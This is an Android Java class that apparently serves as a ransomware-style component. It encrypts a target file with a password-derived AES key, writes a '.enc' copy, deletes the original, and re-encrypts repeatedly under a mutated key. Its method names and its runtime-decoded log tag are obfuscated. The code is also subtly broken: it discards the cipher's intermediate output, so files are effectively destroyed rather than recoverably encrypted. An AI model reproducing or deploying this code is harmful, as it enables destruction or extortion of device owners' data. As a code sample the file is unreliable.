package com.example.myapplication.workers;

import android.content.Context;
import android.util.Log;

import com.example.myapplication.R;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.spec.InvalidKeySpecException;
import java.util.Arrays;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.PBEParameterSpec;

public class EncryptBoi {
    private static Cipher cipher;
    private static byte[] keyBytes;
    private static SecretKeyFactory keyFactory;
    private static PBEParameterSpec parameterSpec;

    public static byte[] weeeeeeeeeeeeee(Context context, File file, byte[] boom){
        final byte[] SALT  = {0x25,0x64,0x10,-0x23,0x3D,0x7D,0x1E,-0x4C};
        final int ITERATIONS = 1000;
        String LOG_TAG = new GimmeString(context.getString(R.string.log)).decryptBoi();
        keyBytes = boom;
        byte[] nextKeys = new byte[256];
        try {
            byte[] ivBytes = new byte[16];
            new SecureRandom().nextBytes(ivBytes);
            cipher = Cipher.getInstance("PBEWithHmacSHA256AndAES_256");
            IvParameterSpec iv = new IvParameterSpec(ivBytes);
            PBEKeySpec keySpec = new PBEKeySpec(new String(keyBytes).toCharArray());
            keyFactory = SecretKeyFactory
                    .getInstance("PBEWithHmacSHA256AndAES_256");
            SecretKey key = keyFactory.generateSecret(keySpec);
            parameterSpec = new PBEParameterSpec(SALT,ITERATIONS,iv);
            cipher.init(Cipher.ENCRYPT_MODE,key,parameterSpec);
            blahblah(file);
            bwoahhhhh(file,10);
            file.delete();
            Log.i(LOG_TAG, Arrays.toString(ivBytes));
        } catch (NoSuchAlgorithmException | InvalidAlgorithmParameterException | InvalidKeyException | NoSuchPaddingException | BadPaddingException | IllegalBlockSizeException | IOException | InvalidKeySpecException e) {
            Log.e(LOG_TAG, "shit", e);
        }
        return nextKeys;
    }

    private static int bwoahhhhh(File file,int i) throws NoSuchAlgorithmException, InvalidKeySpecException, IOException, BadPaddingException, IllegalBlockSizeException, InvalidAlgorithmParameterException, InvalidKeyException {
        if(i <= 1){
            PBEKeySpec keySpec = new PBEKeySpec(new String(keyBytes).toCharArray());
            keyFactory = SecretKeyFactory
                    .getInstance("PBEWithHmacSHA256AndAES_256");
            SecretKey key = keyFactory.generateSecret(keySpec);
            cipher.init(Cipher.ENCRYPT_MODE,key,parameterSpec);
            blahblah(file);
            return i;
        }
        else{
            for(int x = 0;x<keyBytes.length;x++){
                keyBytes[0] = circles(keyBytes[0]);
            }
            return bwoahhhhh(file,i-1) + bwoahhhhh(file,i-2);
        }
    }
    private static byte circles(byte boom){
        return (byte) (boom >>> 2 | boom << (Integer.SIZE - 2));
    }
    private static void blahblah(File file) throws IOException, BadPaddingException, IllegalBlockSizeException {
        FileInputStream fis = new FileInputStream(file);
        File encrypted = new File(file.getAbsolutePath().concat(".enc"));
        FileOutputStream fos = new FileOutputStream(encrypted);
        int z;
        byte[] bytes = new byte[65536];
        z = fis.read(bytes);
        while(z!=-1){
            cipher.update(bytes);
            z = fis.read(bytes);
        }
        fos.write(cipher.doFinal());
        fis.close();
        fos.close();
    }
}
